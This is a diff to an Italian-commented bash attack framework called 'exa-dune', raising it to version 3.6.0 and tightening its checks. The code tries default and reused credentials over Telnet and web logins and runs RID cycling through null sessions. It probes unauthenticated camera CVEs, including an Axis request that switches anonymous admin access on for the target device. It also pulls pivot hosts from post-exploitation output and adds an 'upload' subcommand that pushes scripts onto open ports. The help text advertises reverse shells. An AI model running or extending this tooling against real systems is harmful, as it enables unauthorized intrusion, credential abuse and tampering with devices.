@@ -45,7 +45,7 @@
 
 set -euo pipefail
 
-VERSION="3.5.0"
+VERSION="3.6.0"
 SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
 
 # ── Colori ──────────────────────────────────────────────────
@@ -236,12 +236,15 @@ _FALLBACK_LFI=""
 _FALLBACK_DNS=""
 _FALLBACK_IOT_CREDS=""
 _FALLBACK_RTSP=""
+_FALLBACK_RTSP_USERS=""
+_FALLBACK_RTSP_PASS=""
 _ACTIVE_TMUX_SESSION=""
 
 _cleanup_tmpfiles() {
     rm -f "$_FALLBACK_USERS" "$_FALLBACK_PASS" "$_FALLBACK_WEB" \
           "$_FALLBACK_SNMP" "$_FALLBACK_LFI" "$_FALLBACK_DNS" \
-          "$_FALLBACK_IOT_CREDS" "$_FALLBACK_RTSP" 2>/dev/null || true
+          "$_FALLBACK_IOT_CREDS" "$_FALLBACK_RTSP" \
+          "$_FALLBACK_RTSP_USERS" "$_FALLBACK_RTSP_PASS" 2>/dev/null || true
 }
 _cleanup_sigint()   {
     warn "Interrotto (SIGINT). Cleanup..."
@@ -1033,12 +1036,30 @@ EMBEDDED_RTSP
 # ── Helpers ──────────────────────────────────────────────────
 check_root() { [[ $EUID -eq 0 ]] || { err "Richiede root (sudo)."; exit 1; }; }
 
+_valid_ip() {
+    # Verifica che ogni ottetto sia nel range 0-255
+    local ip="$1"
+    local IFS='.'
+    local -a octs=($ip)
+    [[ ${#octs[@]} -ne 4 ]] && return 1
+    local o
+    for o in "${octs[@]}"; do
+        [[ "$o" =~ ^[0-9]+$ ]] || return 1
+        [[ $o -ge 0 && $o -le 255 ]] || return 1
+    done
+    return 0
+}
+
 validate_target() {
     local t="$1"
-    # IP singolo
-    [[ "$t" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
-    # CIDR (192.168.1.0/24 o 10.0.0.0/8)
-    [[ "$t" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$ ]] && return 0
+    # IP singolo con range ottetti 0-255
+    if [[ "$t" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        _valid_ip "$t" && return 0
+    fi
+    # CIDR con range ottetti 0-255
+    if [[ "$t" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$ ]]; then
+        _valid_ip "${t%%/*}" && return 0
+    fi
     # Hostname (inclusi sottodomini)
     [[ "$t" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9\-]+)*(\.[a-zA-Z]{2,})+$ ]] && return 0
     # Hostname semplice senza TLD (es. "router", "camera1")
@@ -1449,12 +1470,11 @@ _default_creds_for_vendor() {
 }
 
 _make_vendor_creds_file() {
-    # Crea file temporaneo coppie user:pass per hydra per un dato vendor
+    # Crea file temporaneo coppie user:pass (formato hydra -C) per un dato vendor
     local vendor="$1"
     local tmpfile; tmpfile=$(mktemp)
     local creds; creds=$(_default_creds_for_vendor "$vendor")
     for pair in $creds; do
-        echo "${pair//:/ }" | awk '{print "-l "$1" -p "$2}' >> "$tmpfile" 2>/dev/null || true
         echo "$pair" >> "$tmpfile"
     done
     echo "$tmpfile"
@@ -1583,10 +1603,15 @@ _cred_propagate() {
                 fi
             fi
         done
-        # Testa Telnet
+        # Testa Telnet: cattura il banner pre-login, poi invia credenziali e verifica
+        # che la risposta post-login sia diversa dal banner (prompt autenticato)
         if check_port "$target" 23; then
-            if printf '%s\n%s\nexit\n' "$user" "$pass" | \
-               nc -w 3 "$target" 23 2>/dev/null | grep -qiE "prompt|#|\\\$|>"; then
+            local _tel_banner _tel_auth
+            _tel_banner=$(nc -w 2 "$target" 23 2>/dev/null | head -3 || true)
+            _tel_auth=$(printf '%s\n%s\nid\nexit\n' "$user" "$pass" | \
+                        nc -w 4 "$target" 23 2>/dev/null || true)
+            # Verifica presenza di uid= (risposta a 'id') — indica shell autenticata
+            if echo "$_tel_auth" | grep -qE "uid=[0-9]"; then
                 found HIGH "Credential reuse: $user:$pass funziona su Telnet ($target:23)"
                 _cred_store_add telnet "$target" 23 "$user" "$pass" "propagation"
             fi
@@ -1680,7 +1705,7 @@ _cred_change_http() {
             local _ct="application/json"
             echo "$_b" | grep -q "=" && _ct="application/x-www-form-urlencoded"
             local _code
-            _code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
+            _code=$(curl -s ${_ins} -o /dev/null -w "%{http_code}" \
                 --user "${_user}:${_old_pass}" --max-time 6 \
                 -X POST -H "Content-Type: ${_ct}" -d "$_b" \
                 "${_base}${_e}" 2>/dev/null || echo "000")
@@ -2201,10 +2226,7 @@ except Exception as e:
 
     section "Searchsploit (da nmap XML)"
     if require_tool searchsploit && [[ $DRY_RUN -eq 0 ]]; then
-        local tries=0
-        while [[ ! -f "$OUTDIR/nmap_fast.xml" && $tries -lt 60 ]]; do
-            sleep 5; ((tries++))
-        done
+        # run_cmd è sincrono: nmap è già terminato, il file XML è disponibile subito
         [[ -f "$OUTDIR/nmap_fast.xml" ]] && \
             searchsploit --nmap "$OUTDIR/nmap_fast.xml" 2>/dev/null | tee "$OUTDIR/searchsploit.txt"
     elif [[ $DRY_RUN -eq 1 ]]; then
@@ -2316,6 +2338,7 @@ cmd_web() {
                  --logfile '$OUTDIR/testssl.log' '${target}:${port}' 2>&1 | tail -20"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/testssl.log" ]]; then
                 grep -iE "CRITICAL|HIGH|MEDIUM|VULNERABLE|NOT ok" "$OUTDIR/testssl.log" 2>/dev/null | \
+                    grep -iv "not vulnerable\|not ok.*ok" | \
                     while IFS= read -r _tline; do
                         found MEDIUM "TLS — $_tline"
                     done || true
@@ -2331,10 +2354,14 @@ cmd_web() {
         local nuclei_opts="-u $nuclei_target -severity low,medium,high,critical -duc -nh -no-verify -o $OUTDIR/nuclei.txt"
         run_cmd "nuclei" "nuclei $nuclei_opts 2>&1"
         if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nuclei.txt" && -s "$OUTDIR/nuclei.txt" ]]; then
-            grep -iE "\[critical\]|\[high\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
+            grep -iE "\[critical\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
+                while IFS= read -r line; do found CRITICAL "Nuclei — $line"; done || true
+            grep -iE "\[high\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                 while IFS= read -r line; do found HIGH "Nuclei — $line"; done || true
-            grep -iE "\[medium\]|\[low\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
+            grep -iE "\[medium\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                 while IFS= read -r line; do found MEDIUM "Nuclei — $line"; done || true
+            grep -iE "\[low\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
+                while IFS= read -r line; do found LOW "Nuclei — $line"; done || true
             local nc; nc=$(wc -l < "$OUTDIR/nuclei.txt" 2>/dev/null || echo 0)
             log "  Nuclei: $nc finding(s) → $OUTDIR/nuclei.txt"
         fi
@@ -2349,7 +2376,7 @@ cmd_web() {
         run_cmd "wafw00f" \
             "wafw00f '${base_url}' -o '$OUTDIR/wafw00f.txt' 2>&1 | tee '$OUTDIR/wafw00f_stdout.txt' || true"
         if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/wafw00f_stdout.txt" ]]; then
-            if grep -qiE "is behind|WAF" "$OUTDIR/wafw00f_stdout.txt" 2>/dev/null; then
+            if grep -qiE "is behind [a-zA-Z]" "$OUTDIR/wafw00f_stdout.txt" 2>/dev/null; then
                 local waf_name; waf_name=$(grep -oiE "behind [^\n]+" "$OUTDIR/wafw00f_stdout.txt" | head -1 || true)
                 found INFO "WEB — WAF rilevato: $waf_name"
             else
@@ -2410,8 +2437,12 @@ cmd_web() {
             code=$(curl -sk $insecure -X "$method" --max-time 5 \
                    -o /dev/null -w "%{http_code}" "${base_url}/" 2>/dev/null)
             echo "  $method → HTTP $code" | tee -a "$OUTDIR/http_methods.txt"
-            [[ "$method" == "PUT" && "$code" != "405" && "$code" != "501" ]] && \
+            # Riporta solo se il server accetta effettivamente il metodo (2xx = successo)
+            # 403/404/405/501/000 non significano che il metodo è "abilitato"
+            if [[ "$method" == "PUT" ]] && \
+               [[ "$code" == "200" || "$code" == "201" || "$code" == "204" ]]; then
                 found MEDIUM "HTTP $method abilitato su $base_url → $code"
+            fi
         done
     else
         echo -e "${CYAN}[DRY-RUN]${NC} Test metodi HTTP: PUT DELETE TRACE CONNECT OPTIONS"
@@ -2483,10 +2514,13 @@ cmd_web() {
             -H "Origin: https://evil.exa-dune-test.local" \
             -I "${base_url}/" 2>/dev/null || true)
         local acao; acao=$(echo "$cors_resp" | grep -i "access-control-allow-origin:" | head -1 || true)
-        if echo "$acao" | grep -qiE "evil\.exa-dune-test|^\*"; then
-            [[ "$acao" == *"*"* ]] && found HIGH "WEB CORS — Access-Control-Allow-Origin: * (wildcard)"
-            echo "$acao" | grep -qi "evil" && \
-                found CRITICAL "WEB CORS — Origin arbitrario riflesso: ${acao}"
+        # Wildcard CORS: il valore contiene '*' (es. "Access-Control-Allow-Origin: *")
+        if [[ "$acao" == *"*"* ]]; then
+            found HIGH "WEB CORS — Access-Control-Allow-Origin: * (wildcard)"
+        fi
+        # Origin reflection: il server riflette il dominio attaccante
+        if echo "$acao" | grep -qi "evil\.exa-dune-test"; then
+            found CRITICAL "WEB CORS — Origin arbitrario riflesso: ${acao}"
         fi
         # Clickjacking: assenza di X-Frame-Options o CSP frame-ancestors
         local xfo; xfo=$(echo "$cors_resp" | grep -i "x-frame-options:" | head -1 || true)
@@ -2550,13 +2584,22 @@ cmd_web() {
                 code=$(curl -sk $insecure --max-time 6 -X POST \
                     -d "$post_data" -o /dev/null -w "%{http_code}" \
                     -L "${login_url}" 2>/dev/null || true)
-                # 200/302 dopo POST con redirect diverso da login → probabile successo
+                # Conferma: richiedi la pagina con e senza credenziali e confronta
+                # Una credenziale è valida se:
+                #  1. la risposta autenticata contiene logout/dashboard ma NON error/invalid
+                #  2. la risposta senza credenziali NON contiene le stesse parole-chiave
+                #     (evita falsi positivi su pagine pubbliche che mostrano "admin" nei menu)
                 if [[ "$code" == "302" ]] || [[ "$code" == "200" ]]; then
-                    local body_check
-                    body_check=$(curl -sk $insecure --max-time 6 -X POST \
-                        -d "$post_data" -L "${login_url}" 2>/dev/null | head -5 || true)
-                    if echo "$body_check" | grep -qiE "logout|dashboard|welcome|admin|panel|home" && \
-                       ! echo "$body_check" | grep -qiE "error|invalid|wrong|failed|incorrect"; then
+                    local body_auth body_noauth
+                    body_auth=$(curl -sk $insecure --max-time 6 -X POST \
+                        -d "$post_data" -L "${login_url}" 2>/dev/null | head -10 || true)
+                    body_noauth=$(curl -sk $insecure --max-time 6 \
+                        -L "${login_url}" 2>/dev/null | head -10 || true)
+                    local auth_hit=0 noauth_hit=0
+                    echo "$body_auth"   | grep -qiE "logout|sign.?out|dashboard" && auth_hit=1
+                    echo "$body_noauth" | grep -qiE "logout|sign.?out|dashboard" && noauth_hit=1
+                    if [[ $auth_hit -eq 1 && $noauth_hit -eq 0 ]] && \
+                       ! echo "$body_auth" | grep -qiE "error|invalid|wrong|failed|incorrect|unauthorized"; then
                         found CRITICAL "WEB AUTH — credenziali default valide: ${u}:${p} (${login_url})"
                         echo "${u}:${p}" >> "$OUTDIR/web_default_creds.txt"
                         break 2
@@ -2917,8 +2960,8 @@ cmd_smb() {
          -oN \"$OUTDIR\"/nmap_ms17010.txt $target 2>&1"
     run_cmd "nmap_smbghost" \
         "nmap -p 445 --script smb-vuln-cve-2020-0796 \
-         -oN \"$OUTDIR\"/nmap_smbghost.txt 2>/dev/null $target 2>&1 || \
-         nmap -p 445 --script safe \
+         -oN \"$OUTDIR\"/nmap_smbghost.txt $target 2>&1 || \
+         nmap -p 445 --script smb2-security-mode,smb-security-mode \
          -oN \"$OUTDIR\"/nmap_smbghost.txt $target 2>&1"
     if [[ $DRY_RUN -eq 0 ]]; then
         grep -qiE "VULNERABLE" "$OUTDIR/nmap_ms17010.txt" 2>/dev/null && \
@@ -2977,12 +3020,20 @@ cmd_smb() {
             fi
         done
         # RID cycling user enumeration
+        # Prima ottieni il domain SID reale tramite lookupnames, poi cicla i RID
         if tool_ok rpcclient; then
             run_cmd "rid_cycle" \
-                "for rid in \$(seq 500 530); do \
-                     rpcclient -N -U '' $target -c \"lookupnames guest\" 2>/dev/null | head -1; \
-                     rpcclient -N -U '' $target -c \"lookupsids S-1-5-21-\$rid\" 2>/dev/null; \
-                 done | grep -v 'NT_STATUS' | tee \"$OUTDIR\"/rid_cycle.txt"
+                "domain_sid=\$(rpcclient -N -U '' $target -c 'lookupnames administrator' 2>/dev/null \
+                     | grep -oP 'S-1-5-21(-[0-9]+){3}' | head -1); \
+                 if [[ -n \"\$domain_sid\" ]]; then \
+                     for rid in \$(seq 500 1100); do \
+                         rpcclient -N -U '' $target -c \"lookupsids \${domain_sid}-\${rid}\" 2>/dev/null \
+                             | grep -v 'NT_STATUS'; \
+                     done | tee \"$OUTDIR\"/rid_cycle.txt; \
+                 else \
+                     echo 'RID cycle: domain SID non ottenibile (null session bloccata)' \
+                         | tee \"$OUTDIR\"/rid_cycle.txt; \
+                 fi"
         fi
     fi
 
@@ -4319,11 +4370,11 @@ cmd_ssl() {
                 found MEDIUM "SSL:$port — certificato scade tra meno di 30 giorni ($expiry)"
             fi
         fi
-        # Self-signed check
-        if grep -q "Issuer:.*Subject:" "$OUTDIR/cert_full.txt" 2>/dev/null; then
-            local subj; subj=$(grep "Subject:" "$OUTDIR/cert_full.txt" | head -1)
-            local issu; issu=$(grep "Issuer:"  "$OUTDIR/cert_full.txt" | head -1)
-            [[ "$subj" == "$issu" ]] && found MEDIUM "SSL:$port — certificato self-signed"
+        # Self-signed check: confronta i valori di Subject e Issuer (non le righe intere)
+        local subj_val; subj_val=$(grep "Subject:" "$OUTDIR/cert_full.txt" | head -1 | sed 's/.*Subject: //')
+        local issu_val; issu_val=$(grep "Issuer:"  "$OUTDIR/cert_full.txt" | head -1 | sed 's/.*Issuer: //')
+        if [[ -n "$subj_val" && "$subj_val" == "$issu_val" ]]; then
+            found MEDIUM "SSL:$port — certificato self-signed"
         fi
     fi
 
@@ -4354,8 +4405,10 @@ cmd_ssl() {
             "testssl.sh --color 0 --logfile \"$OUTDIR\"/testssl.log \
              --csvfile \"$OUTDIR\"/testssl.csv ${target}:${port} 2>&1 | tee \"$OUTDIR\"/testssl_stdout.txt"
         if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/testssl.csv" ]]; then
+            # Formato CSV testssl.sh: id,fqdn,ip,port,proto,finding,cve,cvss,severity
             grep -iE "CRITICAL|HIGH|MEDIUM" "$OUTDIR/testssl.csv" 2>/dev/null | \
-                while IFS=, read -r _ _ _ sev finding _; do
+                while IFS=, read -r _ _ _ _ _ finding _ _ sev _; do
+                    sev="${sev//\"/}"  # rimuovi eventuali virgolette
                     found "${sev:-MEDIUM}" "testssl — $finding"
                 done || true
         fi
@@ -4365,6 +4418,7 @@ cmd_ssl() {
         if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sslscan.txt" ]]; then
             grep -iE "SSLv2|SSLv3|TLSv1\.0|NULL|EXPORT|RC4|anonymous|Vulnerable" \
                 "$OUTDIR/sslscan.txt" 2>/dev/null | \
+                grep -iv "disabled\|not vulnerable" | \
                 while IFS= read -r line; do found HIGH "SSL:$port — $line"; done || true
         fi
     else
@@ -4372,10 +4426,12 @@ cmd_ssl() {
     fi
 
     section "STARTTLS (porte comuni)"
+    declare -A _STARTTLS_PROTO=([25]="smtp" [587]="smtp" [110]="pop3" [143]="imap" [21]="ftp")
     for stls_port in 25 587 110 143 21; do
         check_port "$target" "$stls_port" || continue
+        local _stls_proto="${_STARTTLS_PROTO[$stls_port]:-smtp}"
         run_cmd "starttls_${stls_port}" \
-            "echo | openssl s_client -connect '${target}:${stls_port}' -starttls smtp \
+            "echo | openssl s_client -connect '${target}:${stls_port}' -starttls ${_stls_proto} \
              2>/dev/null | openssl x509 -noout -subject 2>/dev/null \
              | tee -a \"$OUTDIR\"/starttls.txt" || true
     done
@@ -4945,6 +5001,7 @@ cmd_dns() {
          -oN \"$OUTDIR\"/nmap_dns.txt $target 2>&1"
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_dns.txt" ]]; then
         grep -iE "zone transfer|dns-zone-transfer" "$OUTDIR/nmap_dns.txt" 2>/dev/null | \
+            grep -v "^#" | \
             grep -iv "failed\|ERROR\|could not" | \
             while IFS= read -r line; do found HIGH "DNS — $line"; done || true
     fi
@@ -5142,7 +5199,7 @@ cmd_coap() {
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_coap.txt" ]]; then
         grep -v "^#\|^$\|Nmap " "$OUTDIR/nmap_coap.txt" 2>/dev/null | head -20 \
             | tee "$OUTDIR/coap_nmap_summary.txt" || true
-        grep -iE "open|resource" "$OUTDIR/nmap_coap.txt" 2>/dev/null && \
+        grep -qE "^[0-9]+/.*open" "$OUTDIR/nmap_coap.txt" 2>/dev/null && \
             found MEDIUM "CoAP:$port — servizio CoAP raggiungibile" || true
     fi
 
@@ -5873,8 +5930,10 @@ cmd_camcve() {
     case "$vendor" in
         hikvision)
             # CVE-2021-36260: Command injection via /SDK/webLanguage (unauthenticated)
+            # Il pattern cerca output di /etc/passwd (root:x:0:0) o presenza di /bin/sh
+            # evitando falsi positivi su messaggi di errore generici
             _cam_check "CVE-2021-36260" "Hikvision unauthenticated RCE via webLanguage" \
-                "$base_url/SDK/webLanguage" "root\|passwd\|/bin" "CRITICAL"
+                "$base_url/SDK/webLanguage" "root:x:0:0\|/bin/sh\|/bin/bash\|uid=0" "CRITICAL"
             # CVE-2017-7921: Unauthenticated snapshot bypass
             _cam_check "CVE-2017-7921" "Hikvision unauthenticated snapshot bypass" \
                 "$base_url/onvif-http/snapshot?auth=YWRtaW46MTEM" "JFIF\|Content-Type.*image" "HIGH"
@@ -5886,22 +5945,22 @@ cmd_camcve() {
                 "$base_url/ISAPI/System/deviceInfo" "deviceName\|firmwareVersion" "HIGH"
             ;;
         dahua)
-            # CVE-2021-33044: Authentication bypass via specific URI
+            # CVE-2021-33044: Authentication bypass — risposta autentica include sessionID hex
             _cam_check "CVE-2021-33044" "Dahua auth bypass via magic packet" \
                 "$base_url/cgi-bin/global.login?username=admin&ipAddr=0.0.0.0&clientType=Web3.0" \
-                "session\|success\|token" "CRITICAL"
-            # CVE-2017-7925: Unauthenticated config download
+                '"session"\s*:\s*"[0-9a-fA-F]\{8,\}"\|"result"\s*:\s*"OK"' "CRITICAL"
+            # CVE-2017-7925: Unauthenticated config dump — formato passwd Dahua: user:hash:...
             _cam_check "CVE-2017-7925" "Dahua unauthenticated config dump" \
-                "$base_url/current_config/passwd" "admin\|root\|password" "CRITICAL"
+                "$base_url/current_config/passwd" "admin:[0-9a-fA-F]\{32\}\|root:[0-9a-fA-F]\{32\}" "CRITICAL"
             # Default config exposure
             _cam_check "INFO-DISC" "Dahua device type unauthenticated" \
                 "$base_url/cgi-bin/magicBox.cgi?action=getDeviceType" "DeviceType" "HIGH"
             ;;
         axis)
-            # CVE-2018-10660: Axis root shell via parameter injection
+            # CVE-2018-10660: Axis root shell — risposta autentica è "OK" su riga singola (non in HTML)
             _cam_check "CVE-2018-10660" "Axis unauthenticated root shell via VAPIX" \
                 "$base_url/axis-cgi/admin/param.cgi?action=update&root.Users.Admin.AuthAnonymous=yes" \
-                "OK\|<root>\|AuthAnonymous" "CRITICAL"
+                "^OK$\|root\.Users\.Admin\.AuthAnonymous=yes" "CRITICAL"
             # VAPIX unauthenticated access
             _cam_check "CVE-2016-6201" "Axis VAPIX auth bypass — snapshot" \
                 "$base_url/axis-cgi/jpg/image.cgi" "JFIF\|Content-Type.*image" "HIGH"
@@ -5923,20 +5982,21 @@ cmd_camcve() {
             ;;
         audiocodes)
             # ── AudioCodes MP20x ─────────────────────────────────────────────
-            # CVE-2019-9955: XSS in pagina di management web (GET /Forms/*)
+            # CVE-2019-9955: XSS — verifica che la pagina sia raggiungibile e rifletta contenuto senza auth
+            # Pattern specifico AudioCodes: testo identificativo nella pagina
             _cam_check "CVE-2019-9955" "AudioCodes XSS in web management /Forms/login_security_1.htm" \
-                "$base_url/Forms/login_security_1.htm" "login\|security\|html\|form" "HIGH"
+                "$base_url/Forms/login_security_1.htm" "AudioCodes\|login_security\|MP-20\|Mediant" "HIGH"
             _cam_check "CVE-2019-9955-form" "AudioCodes XSS via /Forms/ (pattern generico)" \
-                "$base_url/Forms/" "title\|form\|input\|script" "HIGH"
-            # CVE-2016-4960: Directory traversal via path nel firmware upgrade
+                "$base_url/Forms/" "AudioCodes\|MP-20\|Mediant\|VoIPerfect" "HIGH"
+            # CVE-2016-4960: Directory traversal — pagina di upgrade raggiungibile senza auth
             _cam_check "CVE-2016-4960" "AudioCodes directory traversal via firmware upgrade path" \
-                "$base_url/Forms/firmware_upgrade_1.htm" "upgrade\|firmware\|upload\|path" "HIGH"
-            # Default credentials check via web management
+                "$base_url/Forms/firmware_upgrade_1.htm" "firmware_upgrade\|MP-20\|Mediant\|AudioCodes" "HIGH"
+            # Default credentials check — identifica specificamente pagina login AudioCodes
             _cam_check "DEFAULT-CREDS-LOGIN" "AudioCodes default credentials page esposta" \
-                "$base_url/Forms/login_security_1.htm" "login\|LoginForm\|password" "MEDIUM"
-            # Pagina di management senza auth
+                "$base_url/Forms/login_security_1.htm" "AudioCodes\|login_security_1\|MP-20" "MEDIUM"
+            # Pagina di management senza auth — pattern specifico del brand
             _cam_check "MGMT-NOAUTH" "AudioCodes management page senza autenticazione" \
-                "$base_url/Forms/" "AudioCodes\|Management\|System" "HIGH"
+                "$base_url/Forms/" "AudioCodes\|VoIPerfect\|MP-20[0-9]\|Mediant" "HIGH"
             # SNMP community "public" espone configurazione SIP
             if [[ $DRY_RUN -eq 0 ]] && command -v snmpwalk &>/dev/null; then
                 log "AudioCodes: verifica SNMP community 'public' per config SIP..."
@@ -6327,7 +6387,7 @@ cmd_vnc() {
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_vnc.txt" ]]; then
         grep -iE "SecurityType:|Protocol version:|None|no auth|bypass" "$OUTDIR/nmap_vnc.txt" 2>/dev/null \
             | tee "$OUTDIR/vnc_summary.txt" || true
-        grep -i "None\|no auth\|bypass" "$OUTDIR/nmap_vnc.txt" 2>/dev/null && \
+        grep -i "None\|no auth\|bypass" "$OUTDIR/nmap_vnc.txt" 2>/dev/null | grep -v "^#" | grep -q . && \
             found CRITICAL "VNC:$port — autenticazione ASSENTE (None auth)" || true
     fi
 
@@ -6412,7 +6472,7 @@ cmd_rdp() {
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_rdp.txt" ]]; then
         grep -iE "encryption|NLA|security layer|VULNERABLE|MS12" "$OUTDIR/nmap_rdp.txt" 2>/dev/null \
             | tee "$OUTDIR/rdp_summary.txt" || true
-        grep -i "VULNERABLE\|MS12-020" "$OUTDIR/nmap_rdp.txt" 2>/dev/null && \
+        grep -i "VULNERABLE\|MS12-020" "$OUTDIR/nmap_rdp.txt" 2>/dev/null | grep -v "^#" | grep -q . && \
             found CRITICAL "RDP:$port — VULNERABILE MS12-020 (DoS/possibile RCE)" || true
         grep -iE "security.*none|encryption.*none" "$OUTDIR/nmap_rdp.txt" 2>/dev/null && \
             found HIGH "RDP:$port — RDP Security (no NLA, traffico non cifrato)" || true
@@ -7199,8 +7259,11 @@ _post_shell() {
         [[ -f "$OUTDIR/post_network.txt" ]] && \
             found INFO "POST:shell — network info raccolto (vedi post_network.txt)"
         # Estrai IP interni da ARP e route per pivot
+        # Filtra: loopback, 0.x, 255.x, e ottetti fuori range (es. 999.x)
         grep -oP '(\d{1,3}\.){3}\d{1,3}' "$OUTDIR/post_network.txt" 2>/dev/null | \
-            grep -vE "^(127\.|0\.0\.0|255\.)" | sort -u > "$OUTDIR/post_pivot_hosts.txt" || true
+            grep -vE "^(127\.|0\.0\.0\.|255\.|0\.)" | \
+            grep -E "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$" | \
+            sort -u > "$OUTDIR/post_pivot_hosts.txt" || true
         local n_hosts; n_hosts=$(wc -l < "$OUTDIR/post_pivot_hosts.txt" 2>/dev/null || echo 0)
         [[ $n_hosts -gt 1 ]] && found MEDIUM "POST:shell — $n_hosts host interni per pivot (post_pivot_hosts.txt)"
     else
@@ -8009,7 +8072,7 @@ cmd_fw() {
     else
         IFS=',' read -ra techs <<< "$tech_str"
         for t in "${techs[@]}"; do
-            case "$t" in
+            case "${t,,}" in
                 ack)           do_ack=1 ;;
                 altscans)      do_alt=1 ;;
                 srcport)       do_srcport=1 ;;
@@ -8839,7 +8902,7 @@ cmd_fw() {
                 local _rest="${_kseq#*:}"
                 local _kcheck="${_rest%%:*}"
                 local _kdesc="${_rest#*:}"
-                log "  Knock: [$(echo "$_kports" | tr ',' '→')] poi check :$_kcheck ($kdesc)..."
+                log "  Knock: [$(echo "$_kports" | tr ',' '→')] poi check :$_kcheck ($_kdesc)..."
                 # Esegui la sequenza di knock (TCP SYN su ogni porta)
                 IFS=',' read -ra _kp_arr <<< "$_kports"
                 for _kp in "${_kp_arr[@]}"; do
@@ -8898,7 +8961,7 @@ cmd_fw() {
                 # Confronta con baseline: porta non presente nel default ports_str → nuova scoperta
                 while IFS= read -r _fp; do
                     [[ -z "$_fp" ]] && continue
-                    if ! echo ",$ports_str," | grep -q ",$_fp,"; then
+                    if ! echo ",$ports_str," | grep -qF ",$_fp,"; then
                         found CRITICAL "Full scan — Porta non-standard aperta: $_fp (non nel set base)"
                         _fw_found "$_fp" "full port scan (porta non-standard)"
                     fi
@@ -9093,12 +9156,13 @@ cmd_fw() {
                 _fw_found "udp/$(echo "$_quic_open" | head -1)" "QUIC/UDP probe"
             fi
         fi
-        # Probe raw UDP su 443: invia ClientHello QUIC-like e vedi se risponde
+        # Probe raw UDP su 443: invia ClientHello QUIC-like e verifica che la risposta
+        # inizi con byte 0xc0-0xff (Long Header QUIC) — non basta qualsiasi risposta UDP
         local _quic_resp
         _quic_resp=$(printf '\xc0\x00\x00\x00\x01\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
-            timeout 3 nc -u -w 3 "$target" 443 2>/dev/null | head -c 4 | xxd 2>/dev/null || true)
-        if [[ -n "$_quic_resp" ]]; then
-            found MEDIUM "QUIC — UDP/443 risponde al probe: possibile QUIC/HTTP3 attivo"
+            timeout 3 nc -u -w 3 "$target" 443 2>/dev/null | head -c 1 | xxd 2>/dev/null || true)
+        if echo "$_quic_resp" | grep -qiE "^0000.*c[0-9a-f]|^0000.*[d-f][0-9a-f]"; then
+            found MEDIUM "QUIC — UDP/443 risponde con Long Header QUIC: HTTP/3 probabilmente attivo"
             _fw_found "443/udp" "QUIC raw probe response"
         fi
         # Verifica alternativa: alt-svc header HTTP/1.1 che annuncia h3
@@ -9465,8 +9529,8 @@ cmd_pipeline() {
         [[ $STEALTH -eq 1 ]] && mod_flags="$mod_flags --stealth"
         [[ $DRY_RUN -eq 1 ]] && mod_flags="$mod_flags --dry-run"
         # --timeout non passato ai sotto-moduli: non tutti lo accettano
-        [[ -n "$CUSTOM_USERS" ]] && mod_flags="$mod_flags --userlist $CUSTOM_USERS"
-        [[ -n "$CUSTOM_PASS"  ]] && mod_flags="$mod_flags --passlist $CUSTOM_PASS"
+        [[ -n "$CUSTOM_USERS" ]] && mod_flags="$mod_flags --userlist \"$CUSTOM_USERS\""
+        [[ -n "$CUSTOM_PASS"  ]] && mod_flags="$mod_flags --passlist \"$CUSTOM_PASS\""
         _timeline_event "  MOD START — $module $args"
         local t0; t0=$(date +%s)
         bash "$SCRIPT_PATH" $module $args $mod_flags 2>&1 || true
@@ -15293,6 +15357,7 @@ cmd_help() {
         redis)   banner; usage_redis  ;;
         http)    banner; usage_http   ;;
         post)    banner; usage_post   ;;
+        upload)  banner; usage_upload ;;
         fw)      banner; usage_fw     ;;
         auto)          banner; usage_auto          ;;
         pipeline)      banner; usage_pipeline      ;;
@@ -15352,6 +15417,7 @@ cmd_help() {
             printf "  %-15s %s\n" "redis"         "Redis audit + RCE check    (redis-cli, nmap)"
             printf "  %-15s %s\n" "http"          "HTTP exploitation embedded  (CGI paths, inject, auth bypass)"
             printf "  %-15s %s\n" "post"          "Post-exploitation + reverse shell"
+            printf "  %-15s %s\n" "upload"        "Carica script/file su porte aperte (HTTP/FTP/TFTP/SMB/SSH/TCP)"
             printf "  %-15s %s\n" "fw"            "Firewall bypass + analysis  (ACK/FIN/frag/src-port/IPv6/UPnP)"
             printf "  %-15s %s\n" "auto"          "Full orchestrated assessment (tmux, auto-profile)"
             printf "  %-15s %s\n" "pipeline"      "Smart pipeline: scan→attack→post→PDF report"
@@ -18876,6 +18942,1925 @@ _progress_bar() {
 # ============================================================
 [[ $# -eq 0 ]] && { cmd_help; exit 0; }
 
+# ============================================================
+#  SUBCOMMAND: upload
+#  Carica script/file su porte aperte tramite il protocollo
+#  appropriato: HTTP PUT/POST, FTP, TFTP, SMB, SSH/SCP, TCP raw
+# ============================================================
+usage_upload() {
+    banner
+    echo -e "${BOLD}Uso:${NC}  exa-dune upload <TARGET> [FILE] [OPTIONS]"
+    echo -e "      exa-dune upload <TARGET> --type <TIPO> [OPTIONS]"
+    echo ""
+    echo -e "${BOLD}Descrizione:${NC}"
+    echo "  Carica script o file su porte aperte del target usando il protocollo"
